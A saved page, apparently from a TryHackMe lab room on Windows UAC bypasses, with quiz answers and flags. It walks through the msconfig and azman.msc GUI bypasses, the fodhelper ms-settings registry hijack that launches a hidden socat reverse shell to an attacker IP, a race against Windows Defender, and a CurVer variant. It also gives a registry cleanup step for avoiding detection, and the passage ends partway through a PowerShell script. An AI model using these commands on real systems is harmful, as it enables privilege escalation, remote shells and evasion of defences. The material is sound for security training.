NT AUTHORITY\INTERACTIVE                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                                Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Mandatory group, Enabled by default, Enabled group
LOCAL                                                         Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level</span></code>
        </pre>
    </div>
</div>
<p><span style="font-size:1rem"><span>Even when we get a Powershell session with an administrative user, <a class="1SffNwTL glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;1SffNwTL&#39;)">UAC</a> prevents us from performing any administrative tasks as we are currently using a filtered token only. If we want to take full control of our target, we must bypass UAC.</span></span><br></p>
<p><span>Interestingly enough, Microsoft doesn't consider <a class="CCitUCCq glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;CCitUCCq&#39;)">UAC</a> a security boundary but rather a simple convenience to the administrator to avoid unnecessarily running processes with administrative privileges. In that sense, the UAC prompt is more of a reminder to the user that they are running with high privileges rather than impeding a piece of malware or an attacker from doing so. Since it isn't a security boundary, any bypass technique is not considered a vulnerability to Microsoft, and therefore some of them remain unpatched to this day.</span></p>
<p><span>Generally speaking, most of the bypass techniques rely on us being able to leverage a High IL process to execute something on our behalf. Since any process created by a High IL parent process will inherit the same integrity level, this will be enough to get an elevated token without requiring us to go through the <a class="trZoos6M glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;trZoos6M&#39;)">UAC</a> prompt. </span></p>
<p><span>For all the scenarios presented in this room, we assume we have access to the server with an administrative account but from a Medium IL console only. Our goal will always be to access a High IL console without going through <a class="RzeU8WiS glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;RzeU8WiS&#39;)">UAC</a>.</span></p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <div>What is the highest integrity level (IL) available on Windows?</div>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ******" value="system" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="2">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>What is the IL associated with an administrator's elevated token?</p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ****" value="high" disabled="">
                            <input type="hidden" value="2">
                            <input type="hidden" value="2">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p><span>What is the full name of the service in charge of dealing with <a class="zq5RY3Fm glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;zq5RY3Fm&#39;)">UAC</a> elevation requests?</span></p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: *********** *********** *******" value="application information service" disabled="">
                            <input type="hidden" value="3">
                            <input type="hidden" value="2">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-3">
                    <div class="card-header task-header collapsed" data-toggle="collapse" href="#collapse3" aria-expanded="false">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 3                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> UAC: GUI based bypasses
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"><i class="far fa-server text-lgreen" data-toggle="tooltip" data-placement="left" title="" data-original-title="Task includes a deployable machine"></i></span>
                        </a>
                    </div>
                    <div id="collapse3" class="collapse show" data-parent="#taskContent" style="">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"><div class="btn-group mb-3 ml-3 float-right">
            <button type="button" class="btn btn-success" value="62448abced1b240049596517" onclick="deploy(this)"><i class="fas fa-play mr-2"></i> Start Machine</button>
        </div> <p><span>We will start by looking at GUI-based bypasses, as they provide an easy way to understand the basic concepts involved. These examples are not usually applicable to real-world scenarios, as they rely on us having access to a graphical session, from where we could use the standard <a class="WGSpe3Se glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;WGSpe3Se&#39;)">UAC</a> to elevate.</span></p><p><span>Click the Start Machine button to deploy your <a class="aCPLYbIZ glossary-term" onclick="initPopOver(&#39;VM&#39;, &#39;aCPLYbIZ&#39;)">VM</a> and connect to it via RDP or in the side by side view in Browser:</span></p><p style="text-align:left"><code>xfreerdp /v:MACHINE_IP /u:attacker /p:Password321</code></p><p style="text-align:left">This machine will be used for all tasks in the room.</p><p style="text-align:left"><br></p>
<h3>Case study: msconfig</h3>
<p><span>Our goal is to obtain access to a High IL command prompt without passing through <a class="Kwoj4bUo glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;Kwoj4bUo&#39;)">UAC</a>. First, let's start by opening msconfig, either from the start menu or the "Run" dialog:</span><br></p><div style="text-align:center"><img style="border:1px solid" src="./TryHackMe _ Bypassing UAC_files/30570f96439f9de572fe97ba508ccdfa.png"><img style="font-size:1rem"></div><p></p>
<p><span>If we analyze the msconfig process with Process Hacker (available on your desktop), we notice something interesting. Even when no <a class="Q1Jp3yEV glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;Q1Jp3yEV&#39;)">UAC</a> prompt was presented to us, msconfig runs as a high IL process:</span></p>
<p style="text-align:center"><img src="./TryHackMe _ Bypassing UAC_files/478a3577ffcd0c186529d9edd34545f4.png"><br></p>
<p>This is possible thanks to a feature called auto elevation that allows specific binaries to elevate without requiring the user's interaction. More details on this later.</p>
<p>If we could force msconfig to spawn a shell for us, the shell would inherit the same access token used by msconfig and therefore be run as a high IL process. By navigating to the Tools tab, we can find an option to do just that:</p>
<p style="text-align:center"><img style="border:1px solid" src="./TryHackMe _ Bypassing UAC_files/efbc49a8c7acfe3f296d0cb46cd2f75a.png"><br></p>
<p><span>If we click Launch, we will obtain a high IL command prompt without interacting with <a class="vJdimfCe glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;vJdimfCe&#39;)">UAC</a> in any way.</span></p>
<p>To retrieve the msconfig flag, use the obtained high integrity console to execute:</p>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Administrator: Command Prompt
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0">           <code class=" language-shell-session"><span class="token output">C:\&gt; C:\flags\GetFlag-msconfig.exe</span></code>
</pre><pre class="terminal-code"><br></pre><p><span style="font-size:1.75rem">Case study: azman.msc</span><br></p></div></div>
<p><span>As with msconfig, azman.msc will auto elevate without requiring user interaction. If we can find a way to spawn a shell from within that process, we will bypass <a class="6Ss4WMjV glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;6Ss4WMjV&#39;)">UAC</a>. Note that, unlike msconfig, azman.msc has no intended built-in way to spawn a shell. We can easily overcome this with a bit of creativity.</span></p>
<p>First, let's run azman.msc:</p>
<p style="text-align:center"><img style="border:1px solid" src="./TryHackMe _ Bypassing UAC_files/769ef59be8fc62884e69a0b39422b2a5.png"><br></p>
<p>We can confirm that a process with high IL was spawned by using Process Hacker. Notice that all .msc files are run from mmc.exe (Microsoft Management Console):</p><p style="text-align:center"><img src="./TryHackMe _ Bypassing UAC_files/2fd110f80a236ea5bbb06518b519b440.png"><br></p>
<p>To run a shell, we will abuse the application's help:</p><p style="text-align:center"><img style="border:1px solid" src="./TryHackMe _ Bypassing UAC_files/2f1aef0aa39ffcf9056999c939e43b8d.png"><br></p>
<p>On the help screen, we will right-click any part of the help article and select <strong>View Source</strong>:</p>
<p style="text-align:center"><img style="border:1px solid" src="./TryHackMe _ Bypassing UAC_files/43e3967d4cdb4c30dc46e7ce81eb2825.png"><br></p>
<p>This will spawn a notepad process that we can leverage to get a shell. To do so, go to <strong>File-&gt;Open</strong> and make sure to select <strong>All Files</strong> in the combo box on the lower right corner. Go to <code>C:\Windows\System32</code><strong></strong> and search for <code>cmd.exe</code><strong></strong> and right-click to select Open:</p>
<p style="text-align:center"><img src="./TryHackMe _ Bypassing UAC_files/8ae24b569d5d95119e79feb425e1b7ff.png"><br></p>
<p><span>This will once again bypass <a class="tEm4tkoc glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;tEm4tkoc&#39;)">UAC</a> and give us access to a high integrity command prompt. You can check the process tree in Process Hacker to see how the high integrity token is passed from mmc (Microsoft Management Console, launched through the Azman), all the way to cmd.exe:</span></p>
<p style="text-align:center"><img src="./TryHackMe _ Bypassing UAC_files/7fb637209e08c712615b992b9d0533ca.png"><br></p>
<p>To retrieve the azman flag, use the obtained high integrity console to execute:</p>

<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Administrator: Command Prompt
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0">           <code class=" language-shell-session"><span class="token output">C:\&gt; C:\flags\GetFlag-azman.exe</span></code>
        </pre>
    </div>
</div></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                What flag is returned by running the msconfig exploit?
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{***************}" value="THM{UAC_HELLO_WORLD}" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="3">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>What flag is returned by running the azman.msc exploit?<br></p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{**********************}" value="THM{GUI_UAC_BYPASSED_AGAIN}" disabled="">
                            <input type="hidden" value="2">
                            <input type="hidden" value="3">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-4">
                    <div class="card-header task-header collapsed" data-toggle="collapse" href="#collapse4" aria-expanded="false">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 4                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> UAC: Auto-Elevating Processes
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse4" class="collapse show" data-parent="#taskContent" style="">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <h3>AutoElevate</h3>
<p>As mentioned before, some executables can auto-elevate, achieving high IL without any user intervention. This applies to most of the Control Panel's functionality and some executables provided with Windows.</p>
<p>For an application, some requirements need to be met to auto-elevate:</p>
<ul>
<li>The executable must be signed by the Windows Publisher</li>
<li>The executable must be contained in a trusted directory, like <code>%SystemRoot%/System32/</code><strong></strong> or <code>%ProgramFiles%/</code><strong></strong></li>
</ul>
<p>Depending on the type of application, additional requirements may apply:</p>
<ul>
<li>Executable files (.exe) must declare the <b>autoElevate</b> element inside their manifests. To check a file's manifest, we can use <strong><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sigcheck" target="_blank">sigcheck</a></strong>, a tool provided as part of the Sysinternals suite. You can find a copy of sigcheck on your machine on <code>C:\tools\</code>&nbsp;. If we check the manifest for msconfig.exe, we will find the autoElevate property:</li>
</ul>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Command Prompt
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0">           <code class=" language-shell-session"><span class="token output">C:\tools\&gt; sigcheck64.exe -m c:/windows/system32/msconfig.exe
...
&lt;asmv3:application&gt;
	&lt;asmv3:windowsSettings xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings"&gt;
		&lt;dpiAware&gt;true&lt;/dpiAware&gt;
		&lt;autoElevate&gt;true&lt;/autoElevate&gt;
	&lt;/asmv3:windowsSettings&gt;
&lt;/asmv3:application&gt;</span></code>
        </pre>
    </div>
</div>
<ul>
<li>mmc.exe will auto elevate depending on the .msc snap-in that the user requests. Most of the .msc files included with Windows will auto elevate.</li>
<li>Windows keeps an additional list of executables that auto elevate even when not requested in the manifest. This list includes pkgmgr.exe and spinstall.exe, for example.</li>
<li>COM objects can also request auto-elevation by configuring some registry keys (<a class="external-link" href="https://docs.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker" target="_blank">https://docs.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker</a>).</li></ul><p><br></p><ul>
</ul>
<h3>Case study: Fodhelper</h3>
<p><span>Fodhelper.exe is one of Windows default executables in charge of managing Windows optional features, including additional languages, applications not installed by default, or other operating system characteristics. Like most of the programs used for system configuration, fodhelper can auto elevate when using default <a class="nzZhQJXk glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;nzZhQJXk&#39;)">UAC</a> settings so that administrators won't be prompted for elevation when performing standard administrative tasks. While we've already taken a look at an autoElevate executable, unlike msconfig, fodhelper can be abused without having access to a GUI.</span><br></p><p style="text-align:center"><img style="border:1px solid" src="./TryHackMe _ Bypassing UAC_files/705cefc6711f050b45a6f1af4019a679.png"><br></p><p>From an attacker's perspective, this means it can be used through a medium integrity remote shell and leveraged into a fully functional high integrity process. This particular technique was discovered by <a class="external-link" href="https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/" target="_blank">@winscripting</a> and has been used in the wild by the <a class="external-link" href="https://www.cybereason.com/blog/glupteba-expands-operation-and-toolkit-with-lolbins-cryptominer-and-router-exploit" target="_blank">Glupteba malware</a>.</p>
<p>What was noticed about fodhelper is that it searches the registry for a specific key of interest:</p>
<p style="text-align:center"><img style="border:1px solid" src="./TryHackMe _ Bypassing UAC_files/eb7ac876cd05f51495f9882fa00ef832.png"><br></p>
<p>When Windows opens a file, it checks the registry to know what application to use. The registry holds a key known as Programmatic ID (<b>ProgID</b>) for each filetype, where the corresponding application is associated. Let's say you try to open an HTML file. A part of the registry known as the <strong>HKEY_CLASSES_ROOT</strong> will be checked so that the system knows that it must use your preferred web client to open it. The command to use will be specified under the <code>shell/open/command</code><strong></strong> subkey for each file's ProgID. Taking the "htmlfile" ProgID as an example:</p><p style="text-align:center"><img style="border:1px solid" src="./TryHackMe _ Bypassing UAC_files/2428d786ec68d8731dc98b6598211eb9.png"><br></p>
<p>In reality, HKEY_CLASSES_ROOT is just a merged view of two different paths on the registry:</p><table class="table table-bordered"><tbody><tr><td style="text-align:left"><b>Path</b></td><td style="text-align:left"><b>Description</b></td></tr><tr><td style="text-align:left">HKEY_LOCAL_MACHINE\Software\Classes<br></td><td style="text-align:left">System-wide file associations</td></tr><tr><td style="text-align:left">HKEY_CURRENT_USER\Software\Classes<br></td><td style="text-align:left">Active user's file associations</td></tr></tbody></table><p><span style="font-size:1rem">When checking HKEY_CLASSES_ROOT, if there is a user-specific association at </span><strong>HKEY_CURRENT_USER (HKCU)</strong><span style="font-size:1rem">, it will take priority. If no user-specific association is configured, then the system-wide association at </span><strong>HKEY_LOCAL_MACHINE (HKLM)</strong><span style="font-size:1rem"> will be used instead.&nbsp;</span>This way, each user can choose their preferred applications separately if desired.<br></p>
<p><span>Going back to fodhelper, we now see that it's trying to open a file under the ms-settings ProgID. By creating an association for that ProgID in the current user's context under HKCU, we will override the default system-wide association and, therefore, control which command is used to open the file. Since fodhelper is an autoElevate executable, any subprocess it spawns will inherit a high integrity token, effectively bypassing <a class="MDuIIfFq glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;MDuIIfFq&#39;)">UAC</a>.</span><br></p><p><br></p>
<h3>Putting it all together</h3>
<p><span>One of our agents has planted a backdoor on the target server for your convenience. He managed to create an account within the Administrators group, but <a class="kiTLWtHx glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;kiTLWtHx&#39;)">UAC</a> is preventing the execution of any privileged tasks. To retrieve the flag, he needs you to bypass UAC and get a fully functional high IL shell.</span></p>
<p>To connect to the backdoor, you can use the following command:</p><pre style="font-size:14px"><code>nc MACHINE_IP 9999</code></pre>
<p>Once connected, we check if our user is part of the Administrators group and that it is running with a medium integrity token:</p>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Attacker's Shell
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0">           <code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">user@kali</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">nc</span> MACHINE_IP <span class="token number">9999</span></span></span>
<span class="token output">Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;whoami
myserver\attacker

C:\Windows\system32&gt;net user attacker | find "Local Group"
Local Group Memberships      *Administrators       *Users                

C:\Windows\system32&gt;whoami /groups | find "Label"
Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192</span></code>
        </pre>
    </div>
</div>
<p>We set the required registry values to associate the ms-settings class to a reverse shell. For your convenience, a copy of <strong>socat</strong> can be found on <code>c:\tools\socat\</code><strong></strong>. You can use the following commands to set the required registry keys from a standard command line:</p>

<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Command Prompt
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0">           <code class=" language-shell-session"><span class="token output">C:\&gt; set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
C:\&gt; set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:&lt;attacker_ip&gt;:4444 EXEC:cmd.exe,pipes"

C:\&gt; reg add %REG_KEY% /v "DelegateExecute" /d "" /f
The operation completed successfully.

C:\&gt; reg add %REG_KEY% /d %CMD% /f
The operation completed successfully.</span></code>
        </pre>
    </div>
</div>

<p>Notice how we need to create an empty value called <strong>DelegateExecute</strong> for the class association to take effect. If this registry value is not present, the operating system will ignore the command and use the system-wide class association instead.</p>
<p>We set up a listener by using netcat in our machine:</p><p><code>nc -lvp 4444</code><br></p>
<p>And then proceed to execute <strong>fodhelper.exe</strong>, which in turn will trigger the execution of our reverse shell:<br></p>
<table><tbody><tr>
<td style="width:45%">
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Command Prompt
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0">           <code class=" language-shell-session"><span class="token output">C:\&gt; fodhelper.exe








</span></code>
        </pre>
    </div>
</div>
</td>
<td><span style="font-size:64px">➜</span></td>
<td style="width:45%">
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Attacker's Shell
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0">           <code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">user@kali</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">nc</span> -lvp <span class="token number">4444</span>      </span></span>
<span class="token output">Listening on 0.0.0.0 4444
Connection received on 10.10.183.127 49813
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;whoami /groups | find "Label"
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288</span></code>
        </pre>
    </div>
</div>
</td>
</tr></tbody></table>
<p><span>The received shell runs with high integrity, indicating we have successfully bypassed <a class="sCJEl5AC glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;sCJEl5AC&#39;)">UAC</a>.</span></p><p><span style="font-size:1rem">To retrieve the fodhelper flag, use your new shell to execute:</span><br></p>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Administrator: Command Prompt
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0">           <code class=" language-shell-session"><span class="token output">C:\&gt; C:\flags\GetFlag-fodhelper.exe</span></code>
        </pre>
    </div>
</div>
<p><b><span>Note: Keep in mind that the flag will only be returned if you successfully&nbsp;bypassed <a class="cBKslz1G glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;cBKslz1G&#39;)">UAC</a> via fodhelper and only from the resulting high integrity shell.</span></b></p><p><br></p>
<h3>Clearing our tracks</h3>
<p>As a result of executing this exploit, some artefacts were created on the target system in the form of registry keys. To avoid detection, we need to clean up after ourselves with the following command:</p>
<pre class=" language-batch" tabindex="0"><code class=" language-batch">reg delete HKCU\Software\Classes\ms-settings\ /f</code></pre>
<p><b>Note: Be sure to execute the given command to avoid any artefact interfering with the following tasks.</b></p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                What flag is returned by running the fodhelper exploit?
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{******************}" value="THM{AUTOELEVATE4THEWIN}" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="4">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-5">
                    <div class="card-header task-header collapsed" data-toggle="collapse" href="#collapse5" aria-expanded="false">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 5                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> UAC: Improving the Fodhelper Exploit to Bypass Windows Defender
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse5" class="collapse show" data-parent="#taskContent" style="">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <h3><span style="font-size:1.75rem">Windows Defender</span><br></h3>
<p>For simplicity, the machine we are targeting has Windows Defender disabled. But what would happen if it was enabled?</p>
<p>First, using your GUI connection, go to your desktop and double-click the following icon to enable Windows Defender:<br></p><div style="text-align:center"><img style="font-size:1rem"><img src="./TryHackMe _ Bypassing UAC_files/a138ccd399c27bb922efcc266053c3a3.png"></div><p></p>
<p>Now try exploiting fodhelper again through the backdoor connection and see what happens on the server's GUI. Just as you change the <code>(default)</code><strong></strong> value in <code>HKCU\Software\Classes\ms-settings\Shell\Open\command</code><strong></strong> to insert your reverse shell command, a Windows Defender notification will pop up:</p><p style="text-align:center"><img src="./TryHackMe _ Bypassing UAC_files/9ebebccbac675f6b66f98a16446d1859.png"><br></p>
<p><span>By clicking the notification, we can check the details on the alert, which mention a <a class="BKblIpk8 glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;BKblIpk8&#39;)">UAC</a> bypass attempt by modifying a registry value:</span></p><p style="text-align:center"><img style="border:1px solid" src="./TryHackMe _ Bypassing UAC_files/8faadca4b214e13d32a6e7979554dcdc.png"><span style="font-size:1rem"><br></span></p><p><span style="font-size:1rem">If you query the corresponding value on the registry, you will notice it has been erased:</span></p>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Command Prompt
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0">           <code class=" language-shell-session"><span class="token output">C:\Windows\system32&gt;reg query %REG_KEY% /v ""

HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command
    (Default)    REG_SZ    (value not set)</span></code>
        </pre>
    </div>
</div>
<p><span style="font-size:1rem">Although by now it would seem our exploit wouldn't work with Windows Defender enabled, check what happens if you run the same commands but with a slight modification (be sure to replace your IP address where needed):</span><br></p>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Command Prompt
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0">           <code class=" language-shell-session"><span class="token output">C:\&gt; set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
C:\&gt; set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:&lt;attacker_ip&gt;:4444 EXEC:cmd.exe,pipes"

C:\&gt; reg add %REG_KEY% /v "DelegateExecute" /d "" /f
The operation completed successfully.

C:\&gt; reg add %REG_KEY% /d %CMD% /f &amp; reg query %REG_KEY%
HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command
    DelegateExecute    REG_SZ    
    (Default)    REG_SZ    powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:&lt;attacker_ip&gt;:4444 EXEC:cmd.exe,pipes</span></code>
        </pre>
    </div>
</div>

<p>We have added a quick query to the offending registry value right after setting it to the command required for our reverse shell. Surprisingly, the query outputs our command intact.&nbsp;<span style="font-size:1rem">We still get alerted by Windows Defender, and a second later, the offending registry value gets deleted as expected. It appears it takes a moment for Windows Defender to take action on our exploit, so let's set a reverse listener on our attacker's machine:</span></p>
<pre><code>nc -lvp 4444</code></pre>
<p>And modify the exploit to run fodhelper.exe immediately after setting the registry value. If the command runs quick enough, it will just work&nbsp;<span style="font-size:1rem">(be sure to replace your IP address where needed)</span><span style="font-size:1rem">:</span></p>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Command Prompt
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0">           <code class=" language-shell-session"><span class="token output">C:\&gt; set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
C:\&gt; set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:&lt;attacker_ip&gt;:4444 EXEC:cmd.exe,pipes"

C:\&gt; reg add %REG_KEY% /v "DelegateExecute" /d "" /f
The operation completed successfully.

C:\&gt; reg add %REG_KEY% /d %CMD% /f &amp; fodhelper.exe</span></code>
        </pre>
    </div>
</div>

<p><span style="font-size:1rem"><span>Depending on your luck, fodhelper might execute before the <a class="Qd7Q6n3c glossary-term" onclick="initPopOver(&#39;AV&#39;, &#39;Qd7Q6n3c&#39;)">AV</a> kicks in, giving you back a reverse shell. If for some reason it doesn't work for you, keep in mind that this method is unreliable as it depends on a race between the AV and your payload executing first. Should the reverse shell not work, just go ahead and continue with the rest of the room, as a more consistent way to bypass Windows Defender will be given below.</span></span><br></p>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Attacker's Shell
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0">           <code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">user@kali</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">nc</span> -lvp <span class="token number">4444</span>      </span></span>
<span class="token output">Listening on 0.0.0.0 4444
Connection received on 10.10.183.127 49813
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;whoami /groups | find "Label"
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288</span></code>
        </pre>
    </div>
</div>
<p><span style="font-size:1rem">Windows Defender still alerts about the bypass, however. The problem with our current exploit is that it gives little room for variation, as we need to write specific registry keys for it to trigger, making it easy for Windows Defender to detect. But there is still something to be done about it.</span><br></p><p><br></p>
<h3>Improving the fodhelper exploit</h3>
<p>A variation on the fodhelper exploit was proposed by <a class="external-link" href="https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses" target="_blank">@V3ded</a>, where different registry keys are used, but the basic principle is the same.</p>
<p>Instead of writing our payload into <code>HKCU\Software\Classes\ms-settings\Shell\Open\command</code><strong></strong>, we will use the <code>CurVer</code><strong></strong> entry under a progID registry key. This entry is used when you have multiple instances of an application with different versions running on the same system. CurVer allows you to point to the default version of the application to be used by Windows when opening a given file type.</p>
<p>To this end, we will create an entry on the registry for a new progID of our choice (any name will do) and then point the CurVer entry in the ms-settings progID to our newly created progID. This way, when fodhelper tries opening a file using the ms-settings progID, it will notice the CurVer entry pointing to our new progID and check it to see what command to use.</p>
<p>The exploit code proposed by @V3ded uses Powershell to achieve this end. Here is a modified version of it adapted to use our reverse shell&nbsp;<span style="font-size:1rem">(be sure to replace your IP address where needed)</span><span style="font-size:1rem">:</span></p>

<pre class=" language-powershell" tabindex="0"><code class=" language-powershell"><span class="token variable">$program</span> = <span class="token string">"powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:&lt;attacker_ip&gt;:4445 EXEC:cmd.exe,pipes"</span>

<span class="token function">New-Item</span> <span class="token string">"HKCU:\Software\Classes\.pwn\Shell\Open\command"</span> <span class="token operator">-</span>Force
<span class="token function">Set-ItemProperty</span> <span class="token string">"HKCU:\Software\Classes\.pwn\Shell\Open\command"</span> <span class="token operator">-</span>Name <span class="token string">"(default)"</span> <span class="token operator">-</span>Value <span class="token variable">$program</span> <span class="token operator">-</span>Force
    
<span class="token function">New-Item</span> <span class="token operator">-</span>Path <span class="token string">"HKCU:\Software\Classes\ms-settings\CurVer"</span> <span class="token operator">-</span>Force
